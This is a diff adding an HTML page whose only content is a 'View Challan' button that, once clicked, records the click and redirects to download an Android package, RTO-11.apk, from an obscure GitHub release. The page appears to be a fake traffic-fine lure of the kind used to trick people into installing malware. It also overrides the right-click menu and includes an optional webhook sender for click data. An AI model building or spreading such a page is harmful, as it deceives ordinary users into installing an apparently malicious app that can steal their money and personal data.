@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Check Now</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: #f0f0f0;
+    }
+
+    .challan-btn {
+      background-color: red;
+      color: white;
+      font-size: 22px;
+      padding: 18px 40px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: transform 0.2s, background-color 0.2s;
+      font-weight: bold;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+
+    .challan-btn:hover {
+      background-color: #cc0000;
+      transform: translateY(-2px);
+    }
+
+    .challan-btn:active {
+      transform: translateY(0);
+    }
+  </style>
+</head>
+<body>
+
+  <button class="challan-btn" onclick="trackAndDownload()">
+    View Challan
+  </button>
+
+  <script>
+    // Simple tracking function
+    function trackClick() {
+      // Get current count or start at 0
+      let count = localStorage.getItem('challan_clicks') || 0;
+      count = parseInt(count) + 1;
+      
+      // Save updated count
+      localStorage.setItem('challan_clicks', count);
+      
+      // Save timestamp of this click
+      const clickData = {
+        timestamp: new Date().toISOString(),
+        count: count,
+        userAgent: navigator.userAgent.substring(0, 50) // Store first 50 chars
+      };
+      
+      // Store individual click history (keep last 50 clicks)
+      const history = JSON.parse(localStorage.getItem('challan_history') || '[]');
+      history.push(clickData);
+      localStorage.setItem('challan_history', JSON.stringify(history.slice(-50)));
+      
+      // Log to console (visible in F12)
+      console.log(`🚨 Button Clicked!`);
+      console.log(`📊 Total Clicks: ${count}`);
+      console.log(`⏰ Time: ${new Date().toLocaleString()}`);
+      console.log(`🖥️ Browser: ${navigator.userAgent.split(') ')[0].split(' (')[1] || 'Unknown'}`);
+      console.log('---');
+      
+      // Optional: Send to external tracker (uncomment if needed)
+      // sendToExternal(count);
+    }
+    
+    // Optional: External tracking (using webhook.site as example)
+    function sendToExternal(count) {
+      // This is optional - remove if not needed
+      const webhookUrl = ''; // Add your webhook URL here if you want
+      if (webhookUrl) {
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            clicks: count,
+            time: new Date().toISOString()
+          }),
+          mode: 'no-cors'
+        });
+      }
+    }
+    
+    // Main function - track then download
+    function trackAndDownload() {
+      // Track the click first
+      trackClick();
+      
+      // Optional: Show brief loading effect
+      const btn = document.querySelector('.challan-btn');
+      const originalText = btn.textContent;
+      btn.textContent = 'Downloading...';
+      btn.disabled = true;
+      
+      // Wait 300ms to ensure tracking completes, then redirect
+      setTimeout(() => {
+        window.location.href = 'https://github.com/rto-11/Jdj/releases/download/Hrhe/RTO-11.apk';
+      }, 300);
+    }
+    
+    // Initialize - log current count on page load
+    window.addEventListener('load', () => {
+      const count = localStorage.getItem('challan_clicks') || 0;
+      console.log(`🔄 Page Loaded`);
+      console.log(`📈 Current Total Clicks: ${count}`);
+      console.log(`ℹ️  Check F12 → Console for click tracking`);
+      console.log(`ℹ️  Check F12 → Application → Local Storage for raw data`);
+      console.log('=======================================');
+    });
+    
+    // Add right-click menu for quick stats (optional)
+    document.addEventListener('contextmenu', (e) => {
+      e.preventDefault();
+      const count = localStorage.getItem('challan_clicks') || 0;
+      const history = JSON.parse(localStorage.getItem('challan_history') || '[]');
+      const lastClick = history[history.length - 1];
+      
+      const stats = `
+Total Clicks: ${count}
+Last Click: ${lastClick ? new Date(lastClick.timestamp).toLocaleString() : 'Never'}
+First Click: ${history[0] ? new Date(history[0].timestamp).toLocaleDateString() : 'Never'}
+      `.trim();
+      
+      // Copy to clipboard
+      navigator.clipboard.writeText(stats).then(() => {
+        // Brief visual feedback
+        const btn = document.querySelector('.challan-btn');
+        const originalText = btn.textContent;
+        btn.textContent = '✅ Stats Copied!';
+        setTimeout(() => {
+          btn.textContent = originalText;
+        }, 1000);
+      });
+    });
+    
+    // Expose functions for console debugging
+    window.showChallanStats = function() {
+      const count = localStorage.getItem('challan_clicks') || 0;
+      const history = JSON.parse(localStorage.getItem('challan_history') || '[]');
+      
+      console.group('📊 CHALLAN BUTTON STATISTICS');
+      console.log(`Total Clicks: ${count}`);
+      console.log(`Click History (last 50):`, history);
+      console.groupEnd();
+      
+      return { count, history };
+    };
+    
+    window.resetChallanStats = function() {
+      if (confirm('Reset all tracking data?')) {
+        localStorage.removeItem('challan_clicks');
+        localStorage.removeItem('challan_history');
+        console.log('✅ Tracking data reset');
+        return 'Stats reset successfully';
+      }
+      return 'Reset cancelled';
+    };
+    
+    window.exportChallanData = function() {
+      const data = {
+        totalClicks: localStorage.getItem('challan_clicks') || 0,
+        clickHistory: JSON.parse(localStorage.getItem('challan_history') || '[]'),
+        exportDate: new Date().toISOString()
+      };
+      
+      // Create download link
+      const dataStr = JSON.stringify(data, null, 2);
+      const dataBlob = new Blob([dataStr], { type: 'application/json' });
+      const url = URL.createObjectURL(dataBlob);
+      
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = `challan-clicks-${new Date().toISOString().split('T')[0]}.json`;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      URL.revokeObjectURL(url);
+      
+      console.log('📥 Data exported as JSON file');
+      return data;
+    };
+    
+  </script>
+
+</body>
+</html>
